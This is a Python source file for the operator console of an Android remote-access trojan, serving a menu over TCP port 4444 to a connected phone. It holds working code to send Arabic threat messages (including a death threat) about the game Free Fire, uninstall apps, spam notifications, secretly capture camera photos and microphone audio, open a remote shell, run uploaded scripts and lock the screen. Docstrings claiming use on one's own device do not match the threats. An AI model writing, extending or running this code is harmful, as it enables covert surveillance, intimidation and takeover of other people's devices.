import base64
import datetime
import hashlib
import hmac as _hmac
import json
import os
import re
import secrets
import socket
import struct
import sys
import threading
import time
import uuid

HOST = "0.0.0.0"
PORT = 4444
MAX_MESSAGE_SIZE = 8 * 1024 * 1024  # 8 MB maximum size for any message

SCRIPT_MAX_BYTES = 512 * 1024  # 512 KB maximum script size sent to the target

# مجلدات الحفظ للمحتوى المنقول من الجهاز (داخل مجلد النص)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RECORDINGS_DIR = os.path.join(BASE_DIR, "recordings")
CAPTURES_DIR = os.path.join(BASE_DIR, "captures")

# رسائل جاهزة يمكن عرضها كتحذير على الجهاز (تتطابق مع Messages في التطبيق)
MESSAGE_DASHBOARD = [
    "تم اختراق حسابك في فري فاير! بياناتك الشخصية معرضة للخطر. "
    "قم بإلغاء تثبيت اللعبة فوراً لحماية نفسك.",
    "فري فاير يسرق بياناتك الشخصية!",
    "تم تتبع استخدامك لفري فاير!",
    "اللعب المستمر لفري فاير يضر بصحتك!",
    "فري فاير يسبب إدماناً خطيراً!",
    "أنا سأقتلك... فري فاير!",
    "يجب إزالة فري فاير من جهازك الآن!",
]

ALLOWED_IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}

# مكتبات الوسائط: الصوت منفصل تماماً عن الفيديو.
# مكتبة الأصوات -> app/src/main/assets/audio/
# مكتبة الفيديو -> app/src/main/assets/video/
# res/raw يحتفظ فقط بالأصوات القديمة (legacy) ولا يحتوي أي ملف فيديو.
BASE_MEDIA_DIR = os.path.join(BASE_DIR, "app", "src", "main", "assets")
AUDIO_DIR = os.path.join(BASE_MEDIA_DIR, "audio")
VIDEO_DIR = os.path.join(BASE_MEDIA_DIR, "video")

AUDIO_EXTENSIONS = {".wav", ".mp3", ".m4a", ".ogg", ".aac", ".flac", ".opus"}
VIDEO_EXTENSIONS = {".mp4", ".webm", ".mkv", ".3gp", ".mov"}

_VIDEO_NAME_RE = re.compile(r"video_(\d+)", re.IGNORECASE)

_PACKAGE_NAME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9_]*(\.[A-Za-z][A-Za-z0-9_]*)+$")


def scan_audio_library():
    """Return a sorted list of [(id, filename)] for audio files inside
    app/src/main/assets/audio.

    Only audio extensions appear; adding a new audio file to assets/audio
    extends the library automatically. Order is the lowercased filename sort,
    which matches the Android-side audio library so play_sound:<id> always maps
    to the same file.
    """
    try:
        names = os.listdir(AUDIO_DIR)
    except OSError:
        return []
    entries = []
    for name in names:
        ext = os.path.splitext(name)[1].lower()
        if ext not in AUDIO_EXTENSIONS:
            continue
        entries.append(name)
    entries.sort(key=lambda n: n.lower())
    return [(i + 1, name) for i, name in enumerate(entries)]


def scan_video_library():
    """Return a sorted list of [(numeric_id, filename)] for files named
    video_<n>.mp4 inside app/src/main/assets/video.

    The numeric id matches the Android-side lookup (play_video:<n> resolves to
    assets/video/video_<n>.mp4). Adding another file named video_5.mp4 extends
    the library automatically.
    """
    try:
        names = os.listdir(VIDEO_DIR)
    except OSError:
        return []
    entries = {}
    for name in names:
        if not name.lower().endswith(".mp4"):
            continue
        stem = os.path.splitext(name)[0]
        match = _VIDEO_NAME_RE.fullmatch(stem)
        if match is None:
            continue
        vid = int(match.group(1))
        if vid not in entries:
            entries[vid] = name
    return [(vid, entries[vid]) for vid in sorted(entries)]

IMAGE_MIME_SIGNATURES = {
    b"\xff\xd8\xff": "jpeg",
    b"\x89PNG": "png",
    b"BM": "bmp",
    b"RIFF": "webp",
}

IMAGE_MAX_BYTES = {
    "jpeg": 5 * 1024 * 1024,
    "png": 5 * 1024 * 1024,
    "bmp": 3 * 1024 * 1024,
    "webp": 5 * 1024 * 1024,
}


def _configure_console():
    """Configure console encoding for correct Unicode output on Windows."""
    for stream in (sys.stdin, sys.stdout, sys.stderr):
        reconfigure = getattr(stream, 'reconfigure', None)
        if reconfigure is not None:
            try:
                reconfigure(encoding='utf-8')
            except Exception:
                pass


def _recv_exact(sock, size):
    """Read an exact number of bytes (handles TCP segmenting)."""
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("connection closed by the remote end")
        data += chunk
    return data


def send_message(sock, message):
    """Send a message: 4-byte length (big-endian) + UTF-8 payload."""
    payload = message.encode('utf-8')
    sock.sendall(struct.pack('>I', len(payload)) + payload)


def receive_message(sock):
    """Receive a message with the same framing."""
    header = _recv_exact(sock, 4)
    length = struct.unpack('>I', header)[0]
    if length > MAX_MESSAGE_SIZE:
        raise ConnectionError(f"message too large: {length}")
    payload = _recv_exact(sock, length)
    return payload.decode('utf-8')


def _validate_image(path):
    """Return (size_bytes, kind, width, height) or None on failure."""
    if not os.path.isfile(path):
        return None
    ext = os.path.splitext(path)[1].lower()
    if ext not in ALLOWED_IMAGE_EXTENSIONS:
        return None

    with open(path, "rb") as f:
        head = f.read(16)

    kind = None
    for magic, k in IMAGE_MIME_SIGNATURES.items():
        if head.startswith(magic):
            kind = k
            break
    if kind is None:
        return None

    size = os.path.getsize(path)
    if size > IMAGE_MAX_BYTES.get(kind, MAX_MESSAGE_SIZE):
        return None

    # الأبعاد فحص اختياري للتقرير؛ الصلاحية الفعلية محسومة عبر التوقيع + الحجم.
    w, h = _detect_image_dimensions(path, kind)
    if w is None or h is None:
        w, h = 0, 0
    return (size, kind, w, h)


def _detect_image_dimensions(path, kind):
    try:
        with open(path, "rb") as f:
            data = f.read(64)
    except OSError:
        return (None, None)

    if kind == "jpeg":
        return _jpeg_size(data)
    if kind == "png":
        return _png_size(data)
    if kind == "bmp":
        return _bmp_size(data)
    if kind == "webp":
        return _webp_size(data)
    return (None, None)


def _jpeg_size(data):
    if len(data) < 4:
        return (None, None)
    for i in range(len(data) - 3):
        if data[i] == 0xff and data[i + 1] == 0xc0:
            if i + 8 <= len(data):
                h = int.from_bytes(data[i + 5:i + 7], "big")
                w = int.from_bytes(data[i + 7:i + 9], "big")
                if h > 0 and w > 0:
                    return (w, h)
    return (None, None)


def _png_size(data):
    if len(data) < 24:
        return (None, None)
    if data[:8] == b"\x89PNG\r\n\x1a\n":
        w = int.from_bytes(data[16:20], "big")
        h = int.from_bytes(data[20:24], "big")
        if w > 0 and h > 0:
            return (w, h)
    return (None, None)


def _bmp_size(data):
    if len(data) < 30:
        return (None, None)
    if data[:2] == b"BM":
        w = int.from_bytes(data[18:22], "little")
        h = int.from_bytes(data[22:26], "little")
        if w > 0 and h > 0:
            return (w, abs(h))
    return (None, None)


def _webp_size(data):
    if len(data) < 12:
        return (None, None)
    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        if len(data) >= 20:
            w = int.from_bytes(data[24:28], "little")
            h = int.from_bytes(data[20:24], "little")
            if w > 0 and h > 0:
                return (w, h)
    return (None, None)


def _image_to_base64(path):
    try:
        with open(path, "rb") as f:
            raw = f.read()
        return base64.b64encode(raw).decode("ascii")
    except OSError:
        return None


def _parse_duration(s):
    s = s.strip()
    if s == "":
        return None
    try:
        d = int(s)
    except ValueError:
        return None
    if d <= 0 or d > 86400:
        return None
    return d


def _parse_int_in_range(s, lo, hi):
    s = s.strip()
    if s == "":
        return None
    try:
        v = int(s)
    except ValueError:
        return None
    if v < lo or v > hi:
        return None
    return v


def _parse_script_delay(s):
    """Delay in seconds for script execution; 0 means immediate."""
    return _parse_int_in_range(s, 0, 86400)


class PhoneController:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.server.settimeout(None)
        self.client_socket = None
        self.client_address = None
        self.connected = False

    def start(self):
        print(f"Waiting for connection on {self.host}:{self.port}...")
        while True:
            try:
                self.client_socket, self.client_address = self.server.accept()
                print(f"Connected from {self.client_address}")
                self.connected = True
                self.show_menu()
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"Connection lost: {e}")
            finally:
                self._disconnect()

    def _disconnect(self):
        self.connected = False
        if self.client_socket is not None:
            try:
                self.client_socket.close()
            except OSError:
                pass
            self.client_socket = None
        self.client_address = None

    def send_command(self, command):
        send_message(self.client_socket, command)

    def show_menu(self):
        while self.connected:
            print("\n--- Control Panel ---")
            print("1. Show threatening message")
            print("2. Remove Free Fire")
            print("3. Disable Free Fire")
            print("4. Send repeated notifications")
            print("5. Play sound")
            print("6. Change wallpaper")
            print("7. Show black screen on boot")
            print("8. Network degradation")
            print("9. Block other apps")
            print("10. Android Shell")
            print("11. Run script")
            print("12. Show device info")
            print("13. Capture camera photo")
            print("14. Record microphone audio")
            print("15. Block screen (strict managed lock)")
            print("16. Play fullscreen video")
            print("17. Show serious warning message")
            print("18. Exit")

            try:
                choice = input("Choose an operation: ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\nSession ended")
                break

            # معالج اختياري للرد يحوّل البيانات المتلقاة إلى ملف محلي (خيارات 13-14)
            handler = None

            try:
                if choice == "18":
                    send_message(self.client_socket, "exit")
                    print("Exit command sent")
                    break
                elif choice == "1":
                    if not self._message_dashboard():
                        continue
                elif choice == "2":
                    self.send_command("remove_freefire")
                elif choice == "3":
                    self.send_command("disable_freefire")
                elif choice == "4":
                    count = input("Number of notifications: ")
                    message = input("Message text: ")
                    self.send_command(f"spam_notifications:{count}:{message}")
                elif choice == "5":
                    if not self._play_sound():
                        continue
                elif choice == "6":
                    if not self._change_wallpaper():
                        continue
                elif choice == "7":
                    self.send_command("black_screen_on_boot")
                elif choice == "8":
                    if not self._network_degradation():
                        continue
                elif choice == "9":
                    if not self._block_app():
                        continue
                elif choice == "10":
                    self._android_shell()
                    continue
                elif choice == "11":
                    if not self._run_script():
                        continue
                elif choice == "12":
                    self.send_command("device_info")
                elif choice == "13":
                    self.send_command("capture_camera")
                    handler = self._handle_photo_reply
                elif choice == "14":
                    duration = input("Duration in seconds: ").strip()
                    record_secs = _parse_int_in_range(duration, 1, 600)
                    if record_secs is None:
                        print("Result: Error - duration must be an integer between 1 and 600 seconds.")
                        continue
                    self.send_command(f"record_audio:{record_secs}")
                    handler = self._handle_audio_reply
                elif choice == "15":
                    if not self._block_screen():
                        continue
                elif choice == "16":
                    if not self._play_video():
                        continue
                elif choice == "17":
                    if not self._serious_warning():
                        continue
                else:
                    print("Invalid choice")
                    continue

                # Receive the result (each command is followed by a single reply in the protocol)
                result = receive_message(self.client_socket)
                if handler is not None:
                    handler(result)
                else:
                    print(f"Result: {result}")
            except (ConnectionError, OSError, EOFError) as e:
                print(f"Lost connection to device: {e}")
                break
            except Exception as e:
                print(f"Unexpected error: {e}")
                break

    def _play_sound(self):
        """Send a sound from the sound library to the target for playback.

        The library is scanned from app/src/main/assets/audio (audio files
        only). Returns True if the command was sent (a reply is expected and
        read by the caller), False if the user went back or validation failed
        (no command was sent, so the caller must skip the receive step).
        """
        print("\n--- Sound Library ---")
        library = scan_audio_library()
        if not library:
            print("No audio files found.")
            print("Result: Error - add an audio file to app/src/main/assets/audio "
                  "and rebuild the app to expand the library.")
            return False
        for sound_id, filename in library:
            print(f"{sound_id}. {filename}")
        print("0. Back")

        choice = input("Choose a sound (0 to go back): ").strip()
        if choice == "0":
            return False

        sound_id = _parse_int_in_range(choice, 1, len(library))
        if sound_id is None:
            print(f"Result: Error - choose a number between 1 and {len(library)}.")
            return False

        duration_str = input("Duration in seconds: ").strip()
        duration = _parse_int_in_range(duration_str, 1, 600)
        if duration is None:
            print("Result: Error - duration must be an integer between 1 and 600 seconds.")
            return False

        filename = library[sound_id - 1][1]
        send_message(self.client_socket, f"play_sound:{sound_id}:{duration}")
        print(f"Sound {sound_id} selected: {filename}")
        print(f"Sending sound ({filename}) for {duration} seconds...")
        return True

    def _change_wallpaper(self):
        """Policy-compliant wallpaper transfer with duration and validation.

        Returns True if the command was sent to the device (a reply is
        expected and will be read by the caller), False if validation failed
        (no command was sent, so the caller must skip the receive step).
        """
        image_path = input("Image path: ")
        duration_str = input("Duration (seconds): ")

        duration = _parse_duration(duration_str)
        if duration is None:
            print("Result: Error - duration must be a positive integer.")
            return False

        image_info = _validate_image(image_path)
        if image_info is None:
            print("Result: Error - file not found or not a valid image.")
            return False

        size_bytes, kind, width, height = image_info
        if size_bytes > MAX_MESSAGE_SIZE:
            print(f"Result: Error - image too large ({kind}, {size_bytes} bytes).")
            return False

        print("Image validated successfully.")
        print("Uploading image...")

        b64 = _image_to_base64(image_path)
        if b64 is None:
            print("Result: Error - failed to read image data.")
            return False

        command = f"change_wallpaper_base64:{duration}:{b64}"
        send_message(self.client_socket, command)
        print("Applying wallpaper...")
        return True

    def _network_degradation(self):
        """Temporary device-local network degradation (latency/loss/bandwidth).

        Sends a request to the target; the target applies the shaping and
        restores the normal condition automatically after the duration.
        Returns True if the command was sent, False on invalid input.
        """
        latency_str = input("Latency (ms) [0-5000, 0 = none]: ")
        loss_str = input("Packet loss (%) [0-100, 0 = none]: ")
        bandwidth_str = input("Bandwidth limit (kbps) [0 = none, Enter for none]: ")
        duration_str = input("Duration (seconds): ")

        latency = _parse_int_in_range(latency_str or "0", 0, 5000)
        if latency is None:
            print("Result: Error - latency must be an integer between 0 and 5000 ms.")
            return False

        loss = _parse_int_in_range(loss_str or "0", 0, 100)
        if loss is None:
            print("Result: Error - packet loss must be an integer between 0 and 100%.")
            return False

        bandwidth = _parse_int_in_range(bandwidth_str or "0", 0, 10_000_000)
        if bandwidth is None:
            print("Result: Error - bandwidth limit must be an integer kbps value (0-10000000).")
            return False

        duration = _parse_duration(duration_str)
        if duration is None:
            print("Result: Error - duration must be an integer between 1 and 86400 seconds.")
            return False

        if latency == 0 and loss == 0 and bandwidth == 0:
            print("Result: Error - no degradation parameters specified (all values are zero).")
            return False

        command = f"network_deg:{latency}:{loss}:{bandwidth}:{duration}"
        send_message(self.client_socket, command)
        print(f"Applying network degradation on target (duration: {duration}s)...")
        return True

    def _run_script(self):
        """Send a script to the target for (possibly delayed) execution.

        The delay is handled on the Android target. Returns True if the
        command was sent, False on invalid input.
        """
        script_path = input("Script path: ").strip()
        delay_str = input("Run after (seconds) [0 = immediately]: ").strip()

        delay = _parse_script_delay(delay_str)
        if delay is None:
            print("Result: Error - delay must be an integer between 0 and 86400 seconds.")
            return False

        if not os.path.isfile(script_path):
            print("Result: Error - script file not found: " + script_path)
            return False

        size = os.path.getsize(script_path)
        if size == 0:
            print("Result: Error - script file is empty.")
            return False
        if size > SCRIPT_MAX_BYTES:
            print(f"Result: Error - script too large ({size} bytes, max {SCRIPT_MAX_BYTES}).")
            return False

        try:
            with open(script_path, "r", encoding="utf-8-sig", errors="replace") as f:
                content = f.read()
        except OSError as e:
            print(f"Result: Error - cannot read script file: {e}")
            return False

        if not content.strip():
            print("Result: Error - script content is empty.")
            return False

        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        command = f"script_base64:{delay}:{b64}"
        send_message(self.client_socket, command)
        print(f"Script sent to device. Delay: {delay}s "
              f"({'executing immediately' if delay == 0 else 'scheduled on the device'}).")
        return True

    def _block_app(self):
        """Ask for an app's package name and send a block request to the target.

        The target prompts the user to confirm the lock before it is applied.
        Returns True if the request was sent (a reply is expected), False on
        invalid input (no request was sent).
        """
        print("Enter the app's package name (technical name, NOT the display name).")
        print("  - Find it on the device: Settings > Apps > tap the app > "
              "App info > the package is shown under the app name.")
        print("  - Example: com.google.android.youtube (YouTube), "
              "org.telegram.messenger (Telegram), com.dts.freefireth (Free Fire).")
        package = input("App package name: ").strip()
        if not package:
            print("Result: Error - package name is empty.")
            return False
        if not _PACKAGE_NAME_RE.match(package):
            print(f"Result: INVALID PACKAGE NAME / PACKAGE NOT FOUND: "
                  f"'{package}' is not a valid Android package name "
                  f"(display names are not accepted).")
            return False
        self.send_command(f"block_app:{package}")
        return True

    def _block_screen(self):
        """Start a strict managed-device lock session (v2) and drive its follow loop.

        Wire format: block_screen:<duration>[:<delay>[:<session_id>]]
        - A strict lock REQUIRES Device Owner (or admin + lock-task-permitted).
          Without it the target replies STRICT_BLOCK_UNAVAILABLE (no fake lock).
        - The session persists independent of the TCP connection: scheduled and
          active sessions survive disconnect/service restart/reboot (remaining
          time is preserved, not reset).
        - Only one session at a time; a new start explicitly replaces the old.

        This method handles sending + receiving itself, so it returns False to
        tell the caller to skip its normal receive step.
        """
        print("Selected: Block screen (STRICT managed-device lock).")
        print("  - Requires Device Owner or (admin + lock task permitted).")
        print("  - Real managed locks only: device owner/administrator API and")
        print("    Lock Task kiosk. No fake fullscreen lock is ever reported.")
        print("  - The lock persists independently of this controller session;")
        print("    it auto-releases after the duration.")
        mode = input("Mode (1=start now, 2=scheduled): ").strip()
        if mode not in ("1", "2"):
            print("Result: Error - choose 1 (start now) or 2 (scheduled).")
            return False
        duration_str = input("Duration in seconds (1-86400): ").strip()
        duration = _parse_duration(duration_str)
        if duration is None:
            print("Result: Error - duration must be an integer between 1 and 86400 seconds.")
            return False
        delay = 0
        if mode == "2":
            delay_str = input("Start delay in seconds (0-86400): ").strip()
            delay = _parse_int_in_range(delay_str, 0, 86400)
            if delay is None:
                print("Result: Error - delay must be an integer between 0 and 86400 seconds.")
                return False
        session_id = input("Session ID (optional, Enter to auto-generate): ").strip()
        if session_id:
            if not session_id.replace("-", "").replace("_", "").isalnum():
                print("Result: Error - session id must be alphanumeric (dashes/underscores allowed).")
                return False
        if not session_id:
            session_id = "BS-" + uuid.uuid4().hex[:8].upper()

        cmd = f"block_screen:{duration}:{delay}:{session_id}"
        self.send_command(cmd)
        print(f"Requesting session '{session_id}' ({duration}s, delay {delay}s)...")

        try:
            result = receive_message(self.client_socket)
        except (ConnectionError, OSError, EOFError):
            print("Lost connection to device while starting block screen.")
            return False
        print(f"Result: {result}")

        if "STRICT_BLOCK_UNAVAILABLE" in result or not result.startswith("BLOCK_SCREEN_STARTED"):
            return False

        try:
            self._block_screen_follow_loop(session_id)
        except (ConnectionError, OSError, EOFError):
            print("Lost connection to device during block-session follow loop.")
        except KeyboardInterrupt:
            print("\nFollow loop interrupted (session remains active on device).")
        return False

    def _block_screen_follow_loop(self, session_id):
        """Interactive loop around an active block session.

        Enter                    -> show session status
        c                        -> cancel the session (real managed release)
        x                        -> back to main menu (session stays active)
        Returns when the session is no longer active on the device.
        """
        print(f"\nSession {session_id} is running.")
        print("Follow loop: [Enter]=status  [c]=cancel  [x]=back")
        while True:
            try:
                key = input("> ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                return
            if key == "x":
                print("Back to menu (session still active on device).")
                return
            if key == "c":
                self.send_command("block_screen_cancel")
                try:
                    result = receive_message(self.client_socket)
                except (ConnectionError, OSError, EOFError):
                    print("Lost connection trying to cancel session.")
                    return
                print(f"Result: {result}")
                return
            # Enter (empty) or anything else -> status
            self.send_command("block_screen_status")
            try:
                result = receive_message(self.client_socket)
            except (ConnectionError, OSError, EOFError):
                print("Lost connection during status check.")
                return
            print(f"Result: {result}")
            if "State: NONE" in result:
                print("The block session has ended on the device.")
                return

    def _play_video(self):
        """Send a fullscreen video request to the target for playback.

        Uses the video library: any mp4 file named video_<n>.mp4 inside
        app/src/main/assets/video. Returns True if the command was sent (a
        reply is expected and read by the caller), False if the user went back
        or the library is empty (no command was sent).
        """
        print("\n--- Video Library ---")
        library = scan_video_library()
        if not library:
            print("No videos found.")
            print("Result: Error - add a video named video_<n>.mp4 to "
                  "app/src/main/assets/video (e.g. video_1.mp4) and rebuild "
                  "the app to expand the library.")
            return False
        for vid, filename in library:
            print(f"{vid}. {filename}")
        print("0. Back")

        choice = input("Choose a video (0 to go back): ").strip()
        if choice == "0":
            return False

        video_id = _parse_int_in_range(choice, 1, 10_000_000)
        if video_id is None:
            print("Result: Error - choose a numeric video id from the list.")
            return False

        matching = [filename for vid, filename in library if vid == video_id]
        if not matching:
            print(f"Result: Error - video id {video_id} is not in the library. "
                  f"Available: {', '.join(str(v) for v, _ in library) or 'none'}.")
            return False

        send_message(self.client_socket, f"play_video:{video_id}")
        print(f"Sending fullscreen video {matching[0]} (id {video_id})...")
        return True

    def _serious_warning(self):
        """Send a fullscreen serious warning message to the target.

        The target shows a black fullscreen warning (up to 2000 characters -
        an informative alert for your own device, e.g. a real battery/thermal
        warning). Returns True if the command was sent (a reply is expected),
        False on invalid input.
        """
        print("Selected: Show serious warning message (fullscreen, black screen).")
        print("  - Maximum 2000 characters.")
        print("  - The user can dismiss it with the close button; it is not "
              "a locked screen.")
        text = input("Warning text: ").strip()
        if not text:
            print("Result: Error - warning text is empty.")
            return False
        self.send_command(f"show_serious_warning:{text}")
        print("Sending serious warning to the target...")
        return True

    def _android_shell(self):
        """Open an interactive Android shell session on the target.

        The Controller is only the terminal interface: every command is
        executed on ANDROID by the app's persistent shell process and the
        output is streamed back. Commands are never interpreted as Controller
        menu selections. Type 'exit' to return to the Control Panel.
        """
        print("\n==================================================")
        print(" Android Shell")
        print(" Target: Android Emulator")
        print("==================================================")
        print("Commands run on ANDROID (the device's shell), not on Windows.")
        print("Type 'exit' to return to the Control Panel.")
        print("")

        try:
            send_message(self.client_socket, "shell_start")
            started = receive_message(self.client_socket)
        except (ConnectionError, OSError, EOFError) as e:
            print(f"Lost connection to device: {e}")
            return
        if not started.startswith("SHELL_SESSION_STARTED"):
            print(f"Result: {started}")
            return

        # اعرض سياق الصلاحيات الفعلي على الهدف فوراً (هوية/JUID)
        print(self._shell_send("id"))

        while True:
            try:
                line = input("$ ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\nClosing shell session...")
                break
            if not line:
                continue
            if line == "exit":
                break
            result = self._shell_send(line)
            if result is None:
                return
            print(result)

        try:
            send_message(self.client_socket, "shell_exit")
            print(receive_message(self.client_socket))
        except (ConnectionError, OSError, EOFError) as e:
            print(f"Lost connection to device: {e}")

    def _shell_send(self, command):
        """Send one command to the Android shell session and return its output."""
        b64 = base64.b64encode(command.encode("utf-8")).decode("ascii")
        try:
            send_message(self.client_socket, "shell_cmd:" + b64)
            return receive_message(self.client_socket)
        except (ConnectionError, OSError, EOFError) as e:
            print(f"Lost connection to device: {e}")
            return None

    def _message_dashboard(self):
        """Send a predefined or custom threat message to display on the device.

        Returns True if the command was sent to the device (a reply is
        expected and will be read by the caller), False if validation failed
        (no command was sent, so the caller must skip the receive step).
        """
        print("\n--- Message Dashboard ---")
        for i, msg in enumerate(MESSAGE_DASHBOARD, start=1):
            print(f"{i}. {msg}")
        print(f"{len(MESSAGE_DASHBOARD) + 1}. Add a new message (custom text)")

        choice = input("Choose a message: ").strip()
        choice_num = _parse_int_in_range(choice, 1, len(MESSAGE_DASHBOARD) + 1)
        if choice_num is None:
            print(f"Result: Error - choose a number between 1 and {len(MESSAGE_DASHBOARD) + 1}.")
            return False

        if choice_num == len(MESSAGE_DASHBOARD) + 1:
            custom_text = input("Message text: ").strip()
            if not custom_text:
                print("Result: Error - message text is empty.")
                return False
            send_message(self.client_socket, f"show_message:txt:{custom_text}")
        else:
            send_message(self.client_socket, f"show_message:idx:{choice_num}")
        print("Sending message to device...")
        return True

    def _handle_photo_reply(self, result):
        """Save a PHOTO_OK:<base64> reply from the device as a local image file."""
        if result.startswith("PHOTO_OK:"):
            b64_data = result[len("PHOTO_OK:"):]
            self._write_recorded_bytes(b64_data, CAPTURES_DIR, "photo", ".jpg")
        else:
            print(f"Result: Error - camera reply from device: {result}")

    def _handle_audio_reply(self, result):
        """Save a record_audio_data:<duration>:<base64> reply as a local 3gp file."""
        if result.startswith("record_audio_data:"):
            rest = result[len("record_audio_data:"):]
            colon = rest.find(":")
            if colon < 0:
                print("Result: Error - audio reply from device is incomplete "
                      "(missing duration or data).")
                return
            b64_data = rest[colon + 1:]
            self._write_recorded_bytes(b64_data, RECORDINGS_DIR, "recording", ".3gp")
        else:
            print(f"Result: Error - audio reply from device: {result}")

    def _write_recorded_bytes(self, b64_text, directory, stem, ext):
        """Decode base64 content and write it to a local file, verifying the write.

        Prints a Result line with the final saved path on success or an error
        description on failure. Returns the saved path or None.
        """
        try:
            data = base64.b64decode(b64_text, validate=True)
        except Exception:
            print("Result: Error - failed to decode the content received from the device.")
            return None

        if not data:
            print("Result: Error - the received content is empty.")
            return None

        try:
            os.makedirs(directory, exist_ok=True)
        except OSError as e:
            print(f"Result: Error - cannot create save directory {directory}: {e}")
            return None

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        path = os.path.join(directory, f"{stem}_{timestamp}{ext}")
        try:
            with open(path, "wb") as f:
                written = f.write(data)
        except OSError as e:
            print(f"Result: Error - failed to write file {path}: {e}")
            return None

        if written != len(data):
            print(f"Result: Error - partial write to {path} ({written}/{len(data)} bytes).")
            try:
                os.remove(path)
            except OSError:
                pass
            return None

        print(f"{stem.capitalize()} saved to: {path} ({written} bytes)")
        return path

    def close(self):
        self._disconnect()
        if self.server is not None:
            try:
                self.server.close()
            except OSError:
                pass
            self.server = None


if __name__ == "__main__":
    _configure_console()
    args = sys.argv[1:]
    if "--legacy" in args:
        while True:
            controller = PhoneController()
            try:
                controller.start()
            except KeyboardInterrupt:
                print("\nProgram closed")
                controller.close()
                break
            except Exception as e:
                print(f"General error: {e}")
                controller.close()
                time.sleep(2)
                print("Restarting the server...")
    else:
        import controller_multi

        auto_enroll = "--no-auto-enroll" not in args
        host = HOST
        port = PORT
        if "--host" in args:
            i = args.index("--host")
            if i + 1 < len(args):
                host = args[i + 1]
        if "--port" in args:
            i = args.index("--port")
            if i + 1 < len(args):
                try:
                    port = int(args[i + 1])
                except ValueError:
                    pass
        controller_multi.run_main(host=host, port=port, auto_enroll=auto_enroll)
